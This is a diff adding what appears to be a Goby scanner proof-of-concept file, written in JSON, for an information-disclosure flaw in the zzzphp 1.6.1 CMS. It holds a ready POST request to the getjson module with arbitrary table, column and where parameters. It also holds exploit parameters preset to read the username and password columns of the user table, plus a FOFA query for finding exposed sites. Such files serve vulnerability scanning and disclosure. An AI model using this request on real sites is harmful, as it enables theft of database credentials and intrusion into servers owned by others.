@@ -1,0 +1,77 @@
+{
+  "Name": "POCID6397 zzzphp 1.6.1 Get database information",
+  "Description": "zzzphp is a free website building system developed with PHP. Its 1.6.1 version can directly obtain database information through http requests, including database user names and passwords, which may cause hackers to smoothly enter the database or sensitive information of the system. Cause the website or server to fall.",
+  "Product": "zzzcms",
+  "Homepage": "http://www.zzzcms.com",
+  "DisclosureDate": "2020-09-03",
+  "Author": "gobysec@gmail.com",
+  "FofaQuery": "app=\"zzzcms\"",
+  "Level": "2",
+  "Impact": "<p>攻击者可通过http请求直接获取数据库信息，包括数据库用户名与密码，可能导致黑客顺利进入数据库或者系统的敏感信息。导致网站或者服务器沦陷。</p>",
+  "Recommendation": "<p>1、限定目录。</p><p>2、白名单限定可读取路径。</p>",
+  "References": [
+    "http://fofa.so"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+		{
+			"name": "tableParams",
+			"type": "input",
+			"value": "user,zzz_brand"
+		},
+		{
+			"name": "colParams",
+			"type": "input",
+			"value": "username,password"
+		}
+	],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "table=sort,zzz_brand&col=s_name,s_lid&where=1=1",
+        "data_type": "text",
+        "follow_redirect": false,
+        "method": "POST",
+		"header":{"Content-Type": "application/x-www-form-urlencoded"},
+        "uri": "/form/index.php?module=getjson"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "s_name",
+            "variable": "$body"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "s_lid",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": null,
+  "Tags": ["infoleak"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": ["zzzcms"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  },
+"Disable": true
+}
